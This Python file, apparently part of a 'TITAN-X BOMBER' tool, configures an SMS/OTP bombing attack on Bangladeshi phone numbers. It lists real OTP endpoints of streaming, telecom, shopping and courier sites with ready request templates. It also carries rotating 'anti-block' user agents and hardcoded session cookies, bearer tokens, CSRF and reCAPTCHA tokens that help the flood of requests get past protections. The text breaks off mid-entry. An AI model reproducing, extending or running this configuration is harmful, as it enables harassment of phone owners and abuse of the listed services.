# api_list.py
# TITAN-X BOMBER API LIST
# Total Working APIs: 24
# Developed by: MAINUL ISLAM

# =========================================================
# EXTRA ANTI-BLOCK USER-AGENTS (2026 UPDATED)
# =========================================================
USER_AGENTS = [
    # --- REALME (High Engagement in BD) ---
    "Mozilla/5.0 (Linux; Android 14; RMX3840) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3708) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3511) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",

    # --- INFINIX & TECNO (Very Common in BD) ---
    "Mozilla/5.0 (Linux; Android 13; Infinix X6711) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; TECNO AD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; TECNO KE5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",

    # --- OPPO (Latest Models) ---
    "Mozilla/5.0 (Linux; Android 14; CPH2583) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2477) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",

    # --- VIVO (Premium Look) ---
    "Mozilla/5.0 (Linux; Android 14; V2303) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; V2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",

    # --- GOOGLE PIXEL (High Trust) ---
    "Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",

    # --- HUAWEI (Safe Mode) ---
    "Mozilla/5.0 (Linux; Android 12; SIG-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; ELS-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 Mobile Safari/537.36",

    # --- BROWSER SPECIALS ---
    "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",

    # --- NEW ANTI-BLOCK AGENTS (2026) ---
    "Mozilla/5.0 (Linux; Android 14; Xiaomi 14 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36"
]

# =========================================================
# ইউজার-এজেন্ট র‍্যান্ডমাইজার ফাংশন
# =========================================================
import random

def get_random_agent():
    """র‍্যান্ডম ইউজার-এজেন্ট রিটার্ন করবে (১০০% ওয়ার্কিং)"""
    return random.choice(USER_AGENTS)

class APIList:
    """সকল API এর তালিকা (২৪ টি) - User-Agent ছাড়া"""
    
    # ==================== স্ট্রিমিং APIs ====================
    STREAMING = [
        {
            "name": "Addatimes",
            "url": "https://app.addatimes.com/api/login",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://www.addatimes.com",
                "Referer": "https://www.addatimes.com/",
                "x-requested-with": "mark.via.gp"
            },
            "data": {
                "phone": "{number}",
                "country_code": "BD"
            },
            "number_format": "0 ছাড়া, 10 digits",
            "success_code": 200
        },
        {
            "name": "Bioscopelive",
            "url": "https://api-dynamic.bioscopelive.com/v2/auth/login",
            "method": "POST",
            "params": {
                "country": "BD",
                "platform": "web",
                "language": "en"
            },
            "headers_template": {
                "Content-Type": "application/json"
            },
            "data": {
                "phone": "880{number}"
            },
            "number_format": "+880 ছাড়া, 880{number}",
            "success_code": 200
        },
        {
            "name": "Bongo",
            "url": "https://accounts.bongobd.com/realms/bongo/login-actions/authenticate",
            "method": "POST",
            "params": {
                "session_code": "QDC8UZiXjeRY8NWz7IX5luVysbBxNbTuT4ORv-M5Eiw",
                "execution": "a8d40102-6986-4bd9-a122-99b1ea13f670",
                "client_id": "otplogin",
                "tab_id": "y_Xm4JeqaD0",
                "client_data": "eyJydSI6Imh0dHBzOi8vYm9uZ29iZC5jb20vcmVnaXN0ZXI_cmVzdW1lVXJsPUx3PT0iLCJydCI6ImNvZGUiLCJybSI6InF1ZXJ5Iiwic3QiOiI5OWUzZDM2Zi00YjhlLTRmMWItYjgzYS0yMzM0M2IxMjY2YTIifQ"
            },
            "headers_template": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "null",
                "x-requested-with": "mark.via.gp"
            },
            "cookies": {
                "AUTH_SESSION_ID": "NDAyMGJmZjMtNWNjOS00NGExLTk4NWUtOGRlYzNmNjFlMjI0LjY0a0ZFLVYwWS1sdzdCZ2RIOW9NdHRYQWNXZGZ3SklYOEhlWjNiVDViVGs4aUF2SVhKQTYyMUliX2pwUHFFeTZpblNwbTdFdzBuTGhWZUVCTFp4OWtR.keycloak-5488947684-tpcv2-5810",
                "bongo-user-uuid": "7f24083c-20c7-462a-8018-1031100bf0dc",
                "anonymousId": "7f24083c-20c7-462a-8018-1031100bf0dc"
            },
            "data": {
                "country": "%2B880",
                "phoneNumberPart": "{number}",
                "phone_number": "%2B880{number}"
            },
            "number_format": "0 ছাড়া, 10 digits",
            "success_codes": [200, 302]
        },
        {
            "name": "Chorki",
            "url": "https://api-dynamic.chorki.com/v2/auth/login",
            "method": "POST",
            "params": {
                "country": "BD",
                "platform": "web",
                "language": "en"
            },
            "headers_template": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Origin": "https://www.chorki.com",
                "Referer": "https://www.chorki.com/",
                "x-requested-with": "mark.via.gp"
            },
            "data": {
                "number": "+880{number}"
            },
            "number_format": "+880 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "Hoichoi",
            "url": "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://www.hoichoi.tv",
                "Referer": "https://www.hoichoi.tv/"
            },
            "data": {
                "phoneNumber": "+880{number}",
                "platform": "MOBILE_WEB"
            },
            "number_format": "+880 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "iScreen",
            "url": "https://api.rockstreamer.com/otp/api/v1/phone/otp",
            "method": "POST",
            "headers_template": {
                "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYzODY2MTM1IiwicHJvdmlkZXJfaWQiOiIxNzcxMDAxMTcyNzQ5LVRpcU40bmtQUk80WmNXa0lWSE1FVFZpTXV1YXhRRW5JemdqTGpkSzYxSW1HemFjWnRwNGVxbFZwbnJvQmZ0dXEiLCJyb2xlIjo0LCJ1c2VybmFtZSI6IjJBTjQ4TyIsInBsYXRmb3JtIjoiaXNjcmVlbiIsInBhcnRuZXIiOm51bGwsInN1YnNjcmliZSI6ZmFsc2UsInBhY2thZ2VJbmZvIjpudWxsLCJpc1RWT0QiOmZhbHNlLCJ0dm9kRXhwaXJlRGF0ZSI6IjE5NzAtMDEtMDEiLCJpYXQiOjE3NzEwMDExNzIsImV4cCI6MTc3MTA4NzU3Mn0.bl40OYMKqxNNfZtYpd64x5dqIgoVu4cscDImkQ3fa-mVlYMnGH0-_FRDvCx_RSo9zvID68EiuZuoSXD977QrlHthzvcsjcTTeAoZAfMLygRhgL-3QnqMtkhQq2hxlZpBreh36zNFMaJLCqQFa4UALj10n_Uq76EsHgD0E9zwpWs8W72_AySrPjux5LRZnX6I1b-_qvl1s28JFEnyz33YW0q2PaqAb-LMcHt5uzRVkcoKsF2hQzmffw7Dai-q3k6SszeFyIO3px4hEjrRbButmbj6S3E8YqQd_oHyN-c0MRK_n-x1HwXRxr2V5HAlwMLygf8rOWZgZDoAl_n5Nj2Isojlknk-dUPCv6eb1R3OPN_1v5il9syF7qf3Xp54_RCmAMLBuQYwgHsivEWV2wlQXbTr0Cs-hGHADVVFVjRa8F-2vCjX0oJETH_drRA0-0onsNbgAMCTJSg9TTD_KCEP19srLm7c_uqotVoh6r9m3UUxXkjXyH36jsbf-o25dBBPikcdkkNLU8iis2tl0etMUL-AvbDZYOqJyL7sYoe1FmK9DFXU-nYuc7pq9bPreadKxMi23ir4DO5jfAKLLm9eJ7pWOhptcFuAI7ZRhMne2cKWv1zjGB-v1CeWTn2qUFQkpEl8EUrIkWc5TdX7p0KAqWu3ffV96leILdrCsIIsFqY",
                "Content-Type": "application/json",
                "Origin": "https://iscreen.com.bd",
                "x-requested-with": "mark.via.gp"
            },
            "data": {
                "phone_number": "+880{number}"
            },
            "number_format": "+880 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "Rang BD",
            "url": "https://api.rang-bd.com/api/auth/otp",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/json"
            },
            "data": {
                "phone": "{number}"
            },
            "number_format": "0 ছাড়া, 10 digits",
            "success_code": 200,
            "simple": True
        },
        {
            "name": "ToffeeLive",
            "url": "https://prod-services.toffeelive.com/sms/v1/subscriber/otp",
            "method": "POST",
            "headers_template": {
                "authorization": "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL3RvZmZlZWxpdmUuY29tIiwiY291bnRyeSI6IkJEIiwiZF9pZCI6IjJlNDliNTA4LTM1ZWMtNDM5MC05NGZiLTJkNDc4MjljZGNmMiIsImV4cCI6MTc3MzYwODg1NiwiaWF0IjoxNzcwOTc5MDU2LCJpc3MiOiJ0b2ZmZWVsaXZlLmNvbSIsImp0aSI6ImQ3ODhmNzdhLTEwODYtNDA5Zi05ZDIxLTlhNzg2ZTNmNmE4MV8xNzcwOTc5MDU2IiwicHJvdmlkZXIiOiJ0b2ZmZWUiLCJyX2lkIjoiMmU0OWI1MDgtMzVlYy00MzkwLTk0ZmItMmQ0NzgyOWNkY2YyIiwic19pZCI6IjJlNDliNTA4LTM1ZWMtNDM5MC05NGZiLTJkNDc4MjljZGNmMiIsInRva2VuIjoiYWNjZXNzIiwidHlwZSI6ImRldmljZSJ9.yETAA9sYcOA1rr64u5gUKphlQuvb_o4db8Xnee34EvF_VhDHFykDAw-j3K21O3rV5MUzWMVg1u5i-L2Qk8GlRA",
                "content-type": "application/json",
                "origin": "https://toffeelive.com",
                "referer": "https://toffeelive.com/",
                "x-requested-with": "mark.via.gp"
            },
            "data": {
                "target": "880{number}",
                "resend": False
            },
            "number_format": "880 দিয়ে, 10 digits",
            "success_code": 200
        }
    ]
    
    # ==================== টেলিকম APIs ====================
    TELECOM = [
        {
            "name": "Airtel",
            "url": "https://www.bd.airtel.com/en",
            "method": "POST",
            "headers_template": {
                "Host": "www.bd.airtel.com",
                "Connection": "keep-alive",
                "sec-ch-ua-platform": '"Android"',
                "next-action": "7f46266fee829907fe0e14d6e17d61382033200c3c",
                "sec-ch-ua": '"Not:A-Brand";v="99", "Android WebView";v="145", "Chromium";v="145"',
                "sec-ch-ua-mobile": "?1",
                "next-router-state-tree": '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22en%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                "Accept": "text/x-component",
                "Content-Type": "text/plain;charset=UTF-8",
                "Origin": "https://www.bd.airtel.com",
                "X-Requested-With": "mark.via.gp",
                "Referer": "https://www.bd.airtel.com/en"
            },
            "cookies": {
                "deviceId": "5afd8081-4d81-4906-a14c-2c470e4b9d30",
                "NEXT_LOCALE": "en"
            },
            "data": '[{"msisdn": "0{number}"}]',
            "data_type": "raw",
            "number_format": "0 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "Grameenphone",
            "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            "data": {
                "msisdn": "0{number}"
            },
            "data_type": "form",
            "number_format": "0 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "Robi",
            "url": "https://www.robi.com.bd/en",
            "method": "POST",
            "headers_template": {
                "Host": "www.robi.com.bd",
                "Connection": "keep-alive",
                "sec-ch-ua-platform": '"Android"',
                "next-action": "7f8620148db6ae73cd937770b1027a2d4555996e04",
                "sec-ch-ua": '"Not:A-Brand";v="99", "Android WebView";v="145", "Chromium";v="145"',
                "sec-ch-ua-mobile": "?1",
                "next-router-state-tree": '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22locale%22%2C%22en%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                "Accept": "text/x-component",
                "Content-Type": "text/plain;charset=UTF-8",
                "Origin": "https://www.robi.com.bd",
                "X-Requested-With": "mark.via.gp",
                "Referer": "https://www.robi.com.bd/en"
            },
            "cookies": {
                "deviceId": "ac319059-4ebc-4ad5-8d15-cd4e46f90a2b",
                "NEXT_LOCALE": "en"
            },
            "data": '[{"msisdn": "0{number}"}]',
            "data_type": "raw",
            "number_format": "0 দিয়ে, 10 digits",
            "success_code": 200
        }
    ]
    
    # ==================== ই-কমার্স APIs ====================
    ECOMMERCE = [
        {
            "name": "Bdshop",
            "url": "https://www.bdshop.com/ajax/send_registration_otp.php",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Origin": "https://www.bdshop.com",
                "Referer": "https://www.bdshop.com/register.php",
                "x-requested-with": "mark.via.gp",
                "x-csrf-token": "a3e4bbd2eb3ee445c42ca7f7a845441544e745cf62ae7c221fa961078fce6ac8"
            },
            "cookies": {
                "PHPSESSID": "ee84ikmi7miaobp0lbc5sd95ps"
            },
            "data": {
                "mobile": "0{number}"
            },
            "number_format": "0 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "Bdstall",
            "url": "https://www.bdstall.com/userRegistration/save_otp_info/",
            "method": "POST",
            "headers_template": {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "X-Requested-With": "mark.via.gp",
                "Origin": "https://www.bdstall.com",
                "Referer": "https://www.bdstall.com/userRegistration/",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            "data": {
                "UserTypeID": "2",
                "RequestType": "1",
                "Name": "Mainul",
                "Mobile": "0{number}",
                "agree_terms": "on"
            },
            "data_type": "form",
            "number_format": "0 দিয়ে, 10 digits",
            "name_required": True,
            "success_codes": [200, 302]
        },
        {
            "name": "Bikroy",
            "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login",
            "method": "GET",
            "headers_template": {
                "x-requested-with": "mark.via.gp",
                "accept": "application/json"
            },
            "params": {
                "phone": "0{number}"
            },
            "data_type": "get_params",
            "number_format": "0 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "Chaldal",
            "url": "https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey",
            "method": "POST",
            "params": {
                "apiKey": "0cAFcWeA4kReseeawHb9pXEPvKEV_eaBChpAPxBd1Or9uKEvQE2thYOeAm5PGTHnTEKOS0Ogc8rsfeeBVafBZ3MOLoEAd_bf5ovX9DujbV2aaPFdO88_sbYFStmNP2wAqEGFRXZGbUKcvoLDBBGAm6nHBHm1gNHQGzbrrCDI15j7SNr_u8GnrIcrPAxwCMGdUQWI7jN-9zTx8f3zRenA4EeGRKJnu3hZpCnDPyxe65wGHZZ231jtW-KZmW5R2_n35AHy3lGUxTLYqbyYVuKComZaJSMuJqt8NxrsTqMYRC-a51ytgjW2Pm1FBTzZSoEkZBIs82knFuq8bs-UNYSCSU1hLKxPGHUDcATmL4I63fIxgupuUnCcEPgBU59QQUzq7sjVsSafZvnN13k3hurIx3Eo0kiCpIFYggCAzv6otkQxDS7tzrMZkQ7q8ZINb5IDYsH2ngERdN5xHT_4T2qJWvJjjJRS88TLGglg6g0g3FMPbPSOCMCgenPQoprPIBgLnXyGp8ZPQssXVHcAbetmNZJhdb_YtdcEx63ZiEmDUfzktP0v_QxhwO6dRJ2noyBWYuyhVr0bI7MhvnaV8XPBqwgQNyqAluMtuPkHydLj9atlI2KnZMRAIgrxeZE3qhJsX-DaIsz_msfmh28cqQfQf_EjfrvsIle0zb6giB-kWYrVGfOpDr1abrnd4goB_wKwPB95wRWFXDQSfokAJ4QNXdOUgu4XNzjv9jcCYmTb-vLthF3GbQqUWTWvq7s4rhDFGmzCZfz3ERQkJpO85djjLCtTY-j16eKtEBKtnaQQU70UYWrnVRh6mqaWbxaM5U_RdGmR_SvaYpQyTAqDdGnqREKG1HwQZVoG3HNtQHND4XsO_3MjyXt43JOw4QpuuFSI_vmysYFABz5RSDPNCFcMasc-W0kSERokZY0WM0VS-XRBaneknHxoRutZU8sGqEcXqBQpzGlugPBrn-4gpidiVpwl38iyE9aEJFHbpu2HHHOU6Kgv6tmY_ypf9ioV2Cs0rjBC2i-soRyH9zfY20obUnzx5vUIsintUeASZFlRNN99aGO_D4UDMd36XjkL8-evQVMAcaMw4Cte3mGn2ZhYnbKCb1zA4G9c2fvUYAX5L0n1uu6Ja7MP5yR8zGlbsjfk59xaO-f9b_vAjRyC0sQiAes_WIN0SFns8aBpIiK1kOdfbuqc0wZibXeXaDhPT0SP63AEMySE6tJ1aJsCRZnL9_wew15O8cGvlNLZ7wRNlwXgWSxBbZ2FfcRgeM9N0rROD3g0zWlZQtd7svnCbDKgqLTI8WD5DEih1jMhN0LnVbzzQN5yJHCddXbxEvpxzbbOEU6xU1a7fn_8uZQD2T-yWQ-yTmYw45q1Ecj1Oh__vpufAFoqEORPqRLrVP0kEmuCj6o6WUz2Syr-NNV7EZjvsjKYmCWxcICJqZdkQT6TF05mB9fG71sUz9_t_xZEDFvuksinnDSwbY9Oy0x7f4ti_aRpSuIE2ZbH8hcwWTVQy5oxTtepf2bLv6LRpXjAMBoCRgRhKTWvKxa1ehneTBP5NpTXoOZc2MLkogdonjjmU_E8oVRpuNoG9KyDcDZYMQMS_hADAl8S3aqhbfdD6cubOzz9wDdGwURu13z-gK2XIXmTWZLJeyG_7uiaX_xbyNSV-dzAqnlrcHx_q4bJLYxu893KMgurpjd-uPnTs8ub6-RZToH5NSluBxyOFqSLSJyswi10mNmsavzjUBYlZiS42c5fQiBko_JCvxGOqPdJi0aLFXG0YC3yBll1wmUKmvACV8QVWVBoKL9aOleiDhoSpI_YKC1QRe6jXijaqvwX7KGOfca6HSeQCaf8Nt1VmBY0A6W4RY13I0E-tLNx84lzpXwvYVectUzHFOtv-ezOqVpR6G4fOdpCTEaLqKsjskqWq4qFF82cIjn71OQsEjUdqD2xlha8_CBVof3UgVmkd2dVG1Tvggr5DRgjsOOKQ8yB2Xgm2OXEhhYnc5C4slyCu_RpL6MIKCuayOwvGJWEMHsZKgBI9JJLEv6XCmoVoGGQetE-9Eyb2nyx6Vkx8VwxWjufvYFDN4nCXCipVES8rzvP7sNAEVpWWQ4kFM9-QScX0ddRtcSDb-sO6PH6fwouGprlL5-vib32mwunWPr4VJyUc41xfWJjMhMsckrev_2OhfDv8wqe6Qdnv21GtLoPkvHYPDnICgzkC9t2rnAZfXpJhShbAqmLiLtUZPPq2hKs4nMSPMJ6s6Vl-FVu3klILhF6dm3HwE_wE7rIhZmq5zlBmKsIPEHl3jmeDbGZ5HY2r2DH5Ow-g32KaVXODXvM0TF2Agm5ctpRPpyfvOpeTjKn6sp56WS6aQGmzUiDiVX323Y0ecqb3MdJCY32fB7GO1qkAh8JQvipcMy7hmZJ7R9iru9CIs91qYyyI",
                "phoneNumber": "0{number}",
                "retryAttempt": "0"
            },
            "data_type": "post_params",
            "number_format": "0 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "Lereve Craze",
            "url": "https://www.lerevecraze.com/login/verify_phone",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Origin": "https://www.lerevecraze.com",
                "Referer": "https://www.lerevecraze.com/login/",
                "x-requested-with": "XMLHttpRequest"
            },
            "cookies": {
                "PHPSESSID": "td3f8f5skedovrc6icluecvq75",
                "JSESSIONID": "393335AE7751FAAABACBF9035A70AEE5"
            },
            "data": {
                "mobile_no": "0{number}",
                "recaptcha_token": "0cAFcWeA7xkvJin40GyqduFli8LvCeeY5KHOiZc4h6HlCdYRPwzmobmkIU0LDg_cKVlq-d7OxA4ofpNWB7kXteIIA_5_tET-jHO2Akp71rebccraLJbfUAHlPInD0j7EbTBRTMfLYgvbSQ_kXeU6Re-FoPgk2tAPkJrpVbFRVGk8mIqrA_eBEdlvR5Z1ucjhif4yF3pCJHG583CIQGr2LVuYUr6Mn_b5cAAl-VYSN6GxGHmiJKMaswuhguZPRDgA5J6PAk4ACLaDBKS1rDUaIUYAhYU2g8mgxijC8kOEngKkMGw_NgKVhVDMwPNungVXIT9oNLIzDpCAlswYf-e9_yF4wqBPuBj9gWCOmPTCyFXWxCzuGmvP1NNS28C_O3_iDg-MWyzP9PNOAJbv-ev7K9s0bpKPTkHCR6m1N_IgjEdaEKHuPsCxNyvA4t8wGyA861j4bmpZ6i-g3GklFD9FCiJRykOJhlaL-t3uZpLKGyAw01YdOk1-thDoDjxpEEEYs5-uHiUr50oGC-kkpqnyIKfMFQtnJkyktlh0qGZSWQVD86cN0Aus0uJQAgcSoJpUnBq-GevnePakA782-DHD2v2vJWb34pnMFJQ7Pf6itlb_uMCN7JDSX_KO171IRxL1rJC9r9khv1S-fkhmvDwWWQCkGkbniGnhKSiBBiAdfvTp3irhkx-GB6a13kRiZ5ICFJMJ_HZYt5hgjF5emkEGnPeA39KJ5icPZdhTs4v-6rAx9mpDew-NOendwslvf49Fq6PX2knGX8zuSjDVSHyhQXtE3UeVDaI9wMslxGmRq5VAMobkuhBLHkyzxz21R-QQUIpYUEoe_xWE19Q9VNqAhcGBT7yGXFACDrOqrikrABlTpLU-9hBDlzk6BxAVgFtEbGeJWEaU2JBSJ7rPojjvh6rFQ0rhr_jvTZQODXKjFJWI2vvvplCYkugd17guHb-ENvw_PBs-7FEVFZJs2FCNTnmJX4AEtVxXT0gimSa4ZtW4h3aPm_ioL5B0W3sfeFMOaC6ZKGvvD8Vb7sMNCW07n9aoTBKFNoJJ6tFQs6hwQJcpO-t_5DmRR9WeN4Houpf0ZTTuB4YFWD_d1xsVGsAcKYiDqa6KEmylp9fVcYxXH2_7NWwoq95UdtM9QW2BnoxtKwByWEDoSHTTSuwagHkqJO6840rfiuO0TDe3W1cnFhudRFZz6tRyO87_VS1E7BwAOCitjv5mtRlzakoDWxxp1oVu0-Jl4Not81_3l5BB9rnxtwdbFZ-LCPgfK7mYvyugFmCZjVCUctzzeRDZv_gmbqs9J_gWS_auJBm3Wb-6QXhl64m3iQXeWLd9WwFVo_0PYT22P8yeqXFEzzD5qpOTRBiihd2GHAyI8zWzCcAB5wIqmFVDVtcgdYcuGnKk6Q5WNSVTgPsMDzWWDasoSf22rVN9Dwm6WTy6NLa4aqs7DIHiG65RYuEG7387DOyGd-ijtp79BmhquM308ogdAp2H-jPAbWQV9IbH46VHzbT-4uuVj6lPnLEaoFGyl4Eli78EY_vB4fpBiuK6WPUsbPNVqAAy3J_se1j8PXGZKNE4UTzEwEK-pLoxzKwQXNd78mrBXiI7Fd3DmsX_Uf6n1afzZhevFJaJd3sFoGmXkHHXVqv0LErky0x-oh5erfzif3zoJl-78M6gAGjzwcL9rYxPLKxrqQhuLq059XIkzRRWxdPcP-YmFWDrbItjNhwlwfBvYchUmGMQfv_kBXxhVU7jc7HUhQBqqfidHemO6NfgMssdbhJXn7yZ5x6Jq06WD7zYcVKB8a1W1LzhiLbr5OtRbxZsfQsVN5tSVT9ZODAEUYXo7PSTCyo7KsKW8e4KoOyXXHnev8YEHgHSTRrvKPMC9ANDZfq9TUF0yqlL7M5I6fdoCkSUiaas8uYIBWES6OK5PVPCuq4inhxvIMOTTkeLOelJMURurSVZ02dPXf8W7YDYOOExRe_ALFGblnVeSAsn_w6b0Lv-hyOg_ZgRq0VoYF1fONRzZFpygP-MaT5VgwlDs67rami8Z_f60qTEY7j6KrOO-e6GyUHYJHa8lTYMuX1rq2w7xt6IzlYx-ye3y-J1gvoOsg-4rj-LNg_zBTnWKN044dTmhzTCYHWF-ksWlm9Fj1NkIrCC0Vzhrx_4RL6Zc9qGUpXl45S9p-5d9QpfQm24dnEfMvl2-GKlySLMbmiBN_DKjhDmdNGrtvLEwJWgGmXiPeICgwXmLTV4uZ7pGtFiC8HtxUQYE5yrzOAzXocEkrebgKPv1HNNPb4iJpYWLukcylY49djDy_XVXzdWogLrXy1qDRA8Kd4q_y67-IMaCq75KSuWecSw",
                "resend": "0"
            },
            "data_type": "form",
            "number_format": "0 দিয়ে, 10 digits",
            "recaptcha_required": True,
            "success_code": 200
        },
        {
            "name": "Othoba",
            "url": "https://othoba.com/ShoppingCart/SendVerificationCode",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
                "Origin": "https://othoba.com",
                "Referer": "https://othoba.com/rock-rider-with-backrest-3y-blue",
                "x-requested-with": "XMLHttpRequest"
            },
            "cookies": {
                ".Nop.Antiforgery": "CfDJ8JvFKrmVdOZMt54UywKZFMYRODF0XBE9wPqFKkzrpLwiB258YOq62YfFX6AMdFt6KWLy4qufF9dMDjIReRr9f1RhPL9Wrn_uIvj5s-VfYO3eNS9QZGrvjJFZx5Z5Y8_gR3Jelv54YZ6GNwXcD_OH4q4",
                ".Nop.Customer": "ae11d840-5a23-416f-92cd-41ea26359536"
            },
            "data": {
                "phoneNumber": "0{number}",
                "__RequestVerificationToken": "CfDJ8JvFKrmVdOZMt54UywKZFMZY5wXc2ZMzQNi5A331Cne8k6JqA8THe3PlQOBRe3-gQgV05gSpDkmDc8ctzCWiFhG1tJZhMFe_-ar5j3hYm6EZKEwCG_Bd99UQWgNbAOJwvDiXH11QFu-GMmVjXBPulfY"
            },
            "data_type": "form",
            "number_format": "0 দিয়ে, 10 digits",
            "token_required": True,
            "success_code": 200
        },
        {
            "name": "Rokomari",
            "url": "https://www.rokomari.com/otp/send",
            "method": "POST",
            "params": {
                "emailOrPhone": "880{number}",
                "countryCode": "BD"
            },
            "headers_template": {
                "Accept": "*/*",
                "Origin": "https://www.rokomari.com",
                "Referer": "https://www.rokomari.com/login",
                "x-requested-with": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            "cookies": {
                "JSESSIONID": "A25B3592AAA45DAE3448167EDDD51061"
            },
            "data_type": "post_params",
            "number_format": "880 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "Shwapno",
            "url": "https://www.shwapno.com/api/auth",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Origin": "https://www.shwapno.com",
                "Referer": "https://www.shwapno.com/",
                "x-requested-with": "mark.via.gp"
            },
            "data": {
                "phoneNumber": "+880{number}"
            },
            "number_format": "+880 দিয়ে, 10 digits",
            "success_code": 200
        },
        {
            "name": "Wafilife",
            "url": "https://www.wafilife.com/api/auth/send-otp",
            "method": "GET",
            "params": {
                "mobileNumber": "0{number}"
            },
            "headers_template": {
                "Accept": "application/json",
                "Origin": "https://www.wafilife.com",
                "Referer": "https://www.wafilife.com/signin"
            },
            "cookies": {
                "cart-session-token": "f7afc8e7-388a-440d-855b-bca86d19475d"
            },
            "data_type": "get_params",
            "number_format": "0 দিয়ে, 10 digits",
            "success_code": 200
        }
    ]
    
    # ==================== কুরিয়ার সার্ভিস APIs ====================
    COURIER = [
        {
            "name": "eCOURIER",
            "url": "https://backoffice.ecourier.com.bd/api/check-mobile",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            "data": {
                "mobile": "0{number}"
            },
            "data_type": "form",
            "number_format": "0 দিয়ে, 10 digits",
            "success_code": 200,
            "simple": True
        },
        {
            "name": "Paperfly",
            "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/json",
                "device_identifier": "mobile",
                "device_name": "android"
            },
            "data": {
                "full_name": "Mainul",
                "company_name": "Mainul",
                "email_address": "mainul{random}@gmail.com",
                "phone_number": "0{number}"
            },
            "data_type": "json",
            "number_format": "0 দিয়ে, 10 digits",
